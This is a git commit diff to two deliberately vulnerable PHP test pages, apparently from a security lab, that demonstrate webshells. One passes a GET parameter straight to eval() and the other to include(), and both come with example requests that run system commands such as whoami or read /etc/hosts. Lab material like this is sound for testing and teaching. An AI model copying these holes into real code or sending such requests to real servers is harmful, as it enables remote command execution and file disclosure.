dc12f96787a47dde4501f3d4ad6eb1eed586e24e
Aaron Lewis <the.warl0ck.1989@gmail.com>
2018-04-10 20:14:09 +0800

    Let us release that way

--- php/vulns/014-webshell-eval.php
+++ php/vulns/014-webshell-eval.php
@@ -1,3 +1,9 @@
+<?php
+	$baseurl = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?val=';
+	$linux   = $baseurl . "system('ls+-lh');";
+	$windows = $baseurl . "system('whoami');";
+?>
+
 <html>
 <head>	
 	<meta charset="UTF-8"/>
@@ -7,18 +13,20 @@
 	<h1>014 - WebShell - 中国菜刀 - eval 方式</h1>
 
 <p>不正常调用: </p>
-<pre>curl '<?php echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?val=system("netstat+-anp");'?>'</pre>
+<p>curl '<a href="<?= $linux ?>" target="_blank"><?= $linux ?></a>'</p>
 <br>
 <p>windows 不正常调用: </p>
-<pre>curl '<?php echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?val=system("netstat+-ano");'?>'</pre>
+<p>curl '<a href="<?= $windows ?>" target="_blank"><?= $windows ?></a>'</p>
 
 <br>
-<p>目录内容</p>
+<p>执行结果</p>
+
 <?php
 	if (isset($_GET['val'])) 
 	{
 		@eval($_GET['val']);
 	}    
 ?>
+
 </body>
 </html>
--- php/vulns/016-webshell-include.php
+++ php/vulns/016-webshell-include.php
@@ -1,3 +1,7 @@
+<?php
+	$any = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?file=/etc/hosts';
+?>
+
 <html>
 <head>
 	<meta charset="UTF-8"/>
@@ -9,15 +13,17 @@
 	<h1>016 - WebShell - 文件包含方式</h1>
 
 	<p>不正常调用</p>
-	<pre>curl '<?php echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?file=/etc/hosts'?>'</pre>
+	<pre>curl '<a href="<?= $any ?>" target="_blank"><?= $any ?></a>'</pre>
 
 	<br>
 	<p>包含内容</p>
+
 <?php 
 	if (isset ($_GET['file']))
 	{
 		include $_GET['file'];
 	}
 ?>
+
 </body>
 </html>
